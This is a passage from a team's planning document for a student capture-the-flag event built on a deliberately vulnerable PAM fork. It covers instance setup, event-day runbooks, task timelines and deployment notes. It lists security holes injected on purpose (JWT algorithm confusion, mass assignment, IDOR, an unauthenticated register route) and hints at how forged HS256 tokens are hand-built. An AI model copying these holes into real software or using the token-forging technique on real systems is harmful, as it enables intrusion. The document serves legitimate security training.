| CTF-MySQL | `CTF-MySQL` | t2.micro | None | `10.0.1.50` | None | `ctf-team-key` | `SG-CTF-MySQL` |
| Lore-Nginx | `Lore-Nginx` | t2.micro | Dynamic | `10.0.0.x` | `apt-lore.duckdns.org` | `ctf-team-key` | `SG-Lore-Nginx` |
| Prod PAM | `SecureGate-PAM` | t2.micro | Existing | Existing | `securepamgate.duckdns.org` | Existing | Existing (separate) |

### SSH Connection Commands

```bash
# CTF-PAM (direct)
ssh -i ~/.ssh/ctf-team-key.pem ubuntu@ctf-pam.duckdns.org

# Lore-Nginx (direct)
ssh -i ~/.ssh/ctf-team-key.pem ubuntu@apt-lore.duckdns.org

# CTF-MySQL (via jump host)
ssh -i ~/.ssh/ctf-team-key.pem -J ubuntu@ctf-pam.duckdns.org ubuntu@10.0.1.50

# pamuser on CTF-MySQL (how the PAM does it — for testing)
ssh -i /path/to/ctf_pam_key -J ubuntu@ctf-pam.duckdns.org pamuser@10.0.1.50
```

---

## 20. Security Boundaries — What Is Intentional vs What Must Be Protected

### What Is Intentionally Vulnerable

| Component | Vulnerability | Intentional? |
|---|---|---|
| `/api/register` (Stage 0) | Unlinked/unauthenticated, discoverable only via fuzzing | ✅ YES |
| `lib/auth.ts` | JWT algorithm confusion | ✅ YES |
| `/api/register` (Stage 2B) | Mass assignment via `clearanceCode` | ✅ YES |
| `/api/audit/sessions/user/[uid]` | IDOR | ✅ YES |
| Nginx `X-Powered-By` header | Not stripped | ✅ YES |
| `/.well-known/jwks.json` | Public key exposed | ✅ YES |
| `clearanceCode → role` mapping | Deliberately undiscoverable without the OSINT-planted provisioning runbook | ✅ YES |
| Admin UUID | Deliberately undiscoverable without OSINT fragment collection | ✅ YES (pending — see Section 23, still not hardcoded) |

### What Must Remain Protected

| Component | Why It Must Be Protected | Protection Mechanism |
|---|---|---|
| SSH access to all EC2s | Team management access | Security Group: team IPs only on port 22 |
| CTF-MySQL direct internet access | Prevents bypass of the PAM | Private subnet, no public IP |
| Production PAM EC2 | Completely separate from CTF | Different VPC Security Group, no cross-rules |
| `CTF_SUBMIT_KEY` value | Secondary guard on flag submission, not the primary identity check anymore (see Section 18A) | Environment variable, embedded in form only |
| `lore_players` session signing key | Now the *actual* authoritative identity for scoring — compromise here means fake scoreboard entries | Isolated JWT signing, distinct from the PAM's own key |
| `ctf-team-key.pem` | SSH key to all instances | Never committed to git, shared over Signal |
| `credentials.csv` | ~20–24 crew-account passwords (not PAM credentials — see Section 13) | Never committed to git, deleted after emails sent |
| pamuser ed25519 private key | SSH auth from PAM to MySQL | In vault only, never in git |
| Internal crew-onboarding route (`/api/internal/crew-accounts`) | Must never be reachable/guessable by players — it creates `lore_players` rows, not PAM accounts, but is still an admin-equivalent surface | Shared secret header, not exposed anywhere in player-facing code or docs |

### Out of Scope for Participants

Delivered in-character as an OPSEC warning from `thebe562` in the terminal-overlay dialogue (Section 2), not as a legal terms-of-engagement document — but the substance is the same:

> The following are OUT OF SCOPE and any attempt constitutes misuse:
> - Any machine or IP not at the designated lore site or `pam-ctf.duckdns.org`
> - The production SecureGate PAM at `securepamgate.duckdns.org`
> - Any AWS management console or metadata endpoint (`169.254.169.254`)
> - Denial of service attacks against any instance
> - Attempting to access other players' crew accounts or PAM accounts
> - Sharing PAM `clearanceCode` values or admin UUID fragments between players before they've earned them individually (this one is enforcement-by-honor-system, but worth stating explicitly)

---

## 21. Event Day Operations

### Pre-Event Checklist (Night Before)

- [ ] All three CTF EC2s running — verify with `check-health.sh`
- [ ] DuckDNS resolving correctly for both subdomains
- [ ] CTF PAM: `docker compose ps` shows all four services healthy
- [ ] CTF-MySQL: MySQL running, `pamuser` login works
- [ ] Lore site: leaderboard.html renders, submit form works
- [ ] Test flag submission end-to-end with a test email (delete from DB after)
- [ ] Discord server set up: `#announcements`, `#help`, `#ctf-discussion` channels
- [ ] Credential emails sent and delivery confirmed for all 24 participants
- [ ] Team members assigned monitoring roles for the event

### Event Day Roles

| Member | Role During Event |
|---|---|
| Member 1 | Monitors Discord, posts hints if players are stuck, makes announcements |
| Member 2 | Monitors CTF PAM Docker logs (`docker compose logs -f`), watches for abuse, answers technical questions |
| Member 3 | Monitors Security Groups, watches for unexpected traffic patterns, handles any MySQL EC2 issues |

### If Something Goes Wrong

**CTF PAM goes down:**
```bash
ssh -i ctf-team-key.pem ubuntu@ctf-pam.duckdns.org
cd ~/ctf-pam
docker compose down && docker compose up -d
```

**CTF-MySQL stops responding:**
```bash
ssh -J ubuntu@ctf-pam.duckdns.org ubuntu@10.0.1.50
sudo systemctl restart mysql
```

**A participant is clearly attempting out-of-scope activity:**
```bash
# Ban their IP at Nginx level
sudo bash /home/ubuntu/ctf-ops/nuclear/ban-ip.sh <IP>
# Alert them in Discord that they have been disqualified
```

**Leaderboard stops updating:**
```bash
# Check MongoDB inside the container
docker compose exec mongo mongosh -u admin -p admin
use securegate_audit
db.ctf_scores.find().sort({solvedAt: -1})
```

**Full reset required (catastrophic failure):**
```bash
sudo bash /home/ubuntu/ctf-ops/nuclear/reset-ctf.sh
# This wipes all sessions, scores, and participant accounts
# Only use if the event needs to be restarted from zero
```

### Post-Event

- Export final leaderboard from MongoDB before shutting down
- Take EBS snapshots of all three CTF instances (for records)
- Stop (but do not terminate) all CTF instances — credits continue but at $0.00/hour for stopped instances
- Upload the attack walkthrough to Discord as a learning resource
- Conduct team debrief: what broke, what was too easy, what was too hard

---

## 22. Timeline & Task Breakdown

### Three-Week Overview

```
WEEK 0 — Day 1  ─────────────────────────────────────────────────────
  ALL MEMBERS: Phase 0 — AWS Bootstrap
  • VPC, subnets, Internet Gateway, Security Groups
  • Three EC2 instances launched
  • DuckDNS configured and resolving
  • Base software installed
  • Jump host access to CTF-MySQL confirmed

WEEK 1  ──────────────────────────────────────────────────────────────
  MEMBER 2: Phase 1 — CTF PAM Fork & Vulnerability Injection
    • Fork repo, create ctf/vulnerable branch
    • Inject all four vulnerabilities
    • Deploy to CTF-PAM EC2
    • Verify each vulnerability individually

  MEMBER 3: Phase 2 — MySQL EC2 & Flag Database
    • Install and configure MySQL 8.0
    • Create four databases with decoy data
    • Create flag table and insert flag
    • Create pamuser SSH account with restricted shell
    • Deliver private key to Member 2

  MEMBER 1: Phase 3 (start) — Lore Page
    • Write lore HTML and narrative
    • Build leaderboard and submit pages
    • Deploy to Lore-Nginx EC2

WEEK 2  ──────────────────────────────────────────────────────────────
  MEMBER 1: Phase 3 (finish) — Leaderboard integration, CSS polish
  MEMBER 2: Phase 4 — Onboarding Pipeline
    • Build bulk account creation script
    • Publish Google Form
    • Write email template
  MEMBER 3: Phase 5 — Hardening & Isolation
    • Lock SSH to team IPs
    • Confirm CTF-MySQL internet isolation
    • UFW on CTF-MySQL
    • EC2 snapshots

WEEK 3  ──────────────────────────────────────────────────────────────
  ALL MEMBERS: Phase 6 — Integration Testing
    • Each member runs full attack chain solo
    • Attack checklist completed (22 items)
    • Collect participant responses from Google Form
    • Run bulk account creation
    • Send credential emails
    • Final hardening pass
    • Discord server ready
    EVENT
```

### Task Breakdown — Thebe / OSINT Partner (rewritten from the 3-member version)

**Thebe — infra, PAM, backend, scoring (absorbs old Member 2 + Member 3 scope)**

| Task | Description | Week |
|---|---|---|
| T-T1 | AWS Phase 0: VPC, subnets, all Security Groups, CTF-PAM + CTF-MySQL EC2s | 0 |
| T-T2 | Fork SecureGate to private `ctf-pam` repo, create `ctf/vulnerable` branch | 1 |
| T-T3 | Inject Stage 2A: algorithm confusion in `lib/auth.ts` | 1 |
| T-T4 | Inject: JWKS endpoint at `/.well-known/jwks.json` | 1 |
| T-T5 | Inject Stage 0/2B: `clearanceCode` mass assignment at `POST /api/register` (already deployed and verified — see Section 23) | 1 |
| T-T6 | Inject: IDOR at `/api/audit/sessions/user/[uid]` | 1 |
| T-T7 | Remove OPERATOR's `access_policies` row for the MySQL asset in `seed.sql`, redeploy, re-verify | 1 |
| T-T8 | Build `lore_players` table + isolated auth routes on the CTF-PAM server (Option B) | 1–2 |
| T-T9 | Change `/api/ctf/submit` to pull `email` from verified `lore_players` session, not POST body | 2 |
| T-T10 | Build `/api/internal/crew-accounts` onboarding route, guarded by shared secret | 2 |
| T-T11 | Set up MySQL on CTF-MySQL EC2, decoy databases, flag table, `pamuser` restricted shell | 1 |
| T-T12 | Hardcode real admin UUID into `seed.sql` for OSINT fragment-splitting (blocks OSINT partner's IDOR chain) | 1–2 |
| T-T13 | Provide ground-truth `clearanceCode` values and admin UUID to OSINT partner for document content | 1–2 |
| T-T14 | Write bulk crew-account creation script (`bulk-create-users.ts`) | 2 |
| T-T15 | Write email send script with rewritten crew-access template | 2 |
| T-T16 | Wire Discord `#alerts`/`#solves` channels per Section 18A scoping | 2 |
| T-T17 | Apply Nginx rate-limiting fix, resolve rate-limit-vs-lockout conflict | 2 |
| T-T18 | Hardening & isolation pass (SSH lockdown, CTF-MySQL isolation checks, snapshots) | 2 |
| T-T19 | Run full integration test — every path (0, 1, 2A, 2B, IDOR, 3) as a player would | 3 |

**OSINT Partner — narrative, lore site, full OSINT chain**

| Task | Description | Week |
|---|---|---|
| O-T1 | Write TASMOC decoy site content + defacement/glitch/terminal-overlay sequence copy | 1 |
| O-T2 | Write `thebe562` dialogue for the terminal overlay (crew narrative, PAM concept explanation) | 1 |
| O-T3 | Build crew dashboard: Lore tab, Hints/Intel tab, Scoreboard/Submit tab (frontend) | 1–2 |
| O-T4 | Decide black-hat crew name (blocks all content below) | 1 |
| O-T5 | Draft the TASMOC provisioning runbook (`clearanceCode → role` mapping, styled as internal doc) | 2 |
| O-T6 | Draft the fake Slack-export leak page, place UUID fragments per Thebe's ground-truth values | 2 |
| O-T7 | (Optional) Draft fake engineering blog post mentioning RS256/HS256 dual support | 2 |
| O-T8 | Design and write Hints/Intel tab breadcrumb copy for each vulnerability (Section 17A) | 2 |
| O-T9 | Set up Discord server structure: channels, roles, invite | 1 |
| O-T10 | Write in-character out-of-scope/OPSEC warning delivered via `thebe562` (Section 20) | 2 |
| O-T11 | Deploy lore site, verify glitch/terminal sequence and dashboard end-to-end | 2–3 |
| O-T12 | Playtest the full OSINT chain solo — confirm each fragment/document is findable and leads to the next | 3 |

---

## 23. Open Items & Deployment Notes

### Open Items / Decisions Needed

- [ ] Black-hat crew name — blocks lore/OSINT content across the board (O-T4), pick this first
- [ ] Remove OPERATOR's `access_policies` row for the MySQL asset in `seed.sql`, redeploy, re-verify `/api/assets` behavior for a blind self-registered OPERATOR (T-T7)
- [ ] Build `lore_players` table + isolated auth routes on the CTF-PAM server (T-T8)
- [ ] Change `/api/ctf/submit` to pull `email` from `lore_players` session instead of POST body (T-T9)
- [ ] Build `/api/internal/crew-accounts` onboarding route (T-T10)
- [ ] Real flag value into `secret_ops.flag` (still placeholder as of last deployment check)
- [ ] Admin UUID not yet hardcoded into `seed.sql` — blocks the IDOR/OSINT fragment chain (T-T12)
- [ ] Draft: provisioning runbook, Slack leak page, UUID fragment placement plan (O-T5, O-T6)
- [ ] Decide Hints tab name and UI treatment (case board vs. plain hint list)
- [ ] Nginx rate-limiting fix confirmed correct but not yet applied to the live box — see deployment notes below
- [ ] Rate-limit (Nginx) vs. app-level lockout (Redis) conflict unresolved — Nginx's `limit_req` currently intercepts before the Redis `attempts > 8` threshold is ever reachable
- [ ] SSH port 22 still open to `0.0.0.0/0` on the CTF-PAM Security Group

### Deployment Notes — Real Bugs Hit (Reference)

Kept here because several are non-obvious and will recur if the stack is redeployed:

- **`docker compose down -v` wipes the Postgres volume** and reverts any manual DB fix. Persist real changes in `seed.sql`, not live `psql` edits. Standard rebuild (no `-v`): `docker compose up -d` → `docker compose exec app npx next build` → `docker compose restart app`.
- **Nginx `location` blocks in the wrong `server{}` block are silently dead.** Certbot creates a port-80 and a port-443 block; rate-limit rules must live in the **443** block alongside the existing `/.well-known/jwks.json` and `/` locations, or they never execute.
- **`limit_req_zone` must be declared exactly once**, in the top-level `http{}` block in `nginx.conf`, never per-site. Duplicate zone names fail `nginx -t`.
- **SSH keys must be added to the correct OS account's `authorized_keys`.** A key generated/authorized under `ubuntu` does nothing for `pamuser` — mismatched `seed-vault.ts` `username` vs. actual authorized key is a common source of "all configured authentication methods failed."
- **`mysql -p` requires no space before the password** (`-p'pass'`, not `-p 'pass'`) or the client misparses the next argument as a database name.
- **`pamuser`'s login shell must be the restricted script itself** (`/usr/local/bin/pamshell.sh`), not plain bash with the script launched inside it — otherwise `exit` from MySQL drops players into a full bash shell, well outside CTF scope.
- **Newer `pyjwt` refuses PEM-shaped keys as HMAC secrets** even passed as raw bytes — this is a testing-tooling quirk, not a server-side restriction. Hand-construct the JWT with `hmac`/`hashlib`/`base64` directly when testing the algorithm-confusion path; the live server accepts tokens built this way.

---

> [!success] Event Goal
> By the end of Week 3, a student sitting anywhere with a browser should be able to receive their crew-access email, sign into the dashboard, read the crew narrative, follow the OSINT chain to unlock the vulnerabilities it gates, self-register a PAM foothold, escalate privileges through either forged or earned admin access, open a proxied database session, and retrieve a flag — all using the same techniques that professional penetration testers and OSINT investigators use every week.
>
> That is not a CTF puzzle. That is a training exercise on live infrastructure, chained to an investigation.
>
> **That is SecureGate CTF.**

---

*SecureGate_CTF_PLAN.md — Full Event Architecture, Vulnerability Design, Narrative & OSINT Chain Reference*
*Rewritten in place — narrative, team structure, attack chain, and identity/scoring architecture updated. Infra sections (AWS/EC2/Security Groups) unchanged from the original design.*
*Team eyes only — never commit to any public repository*
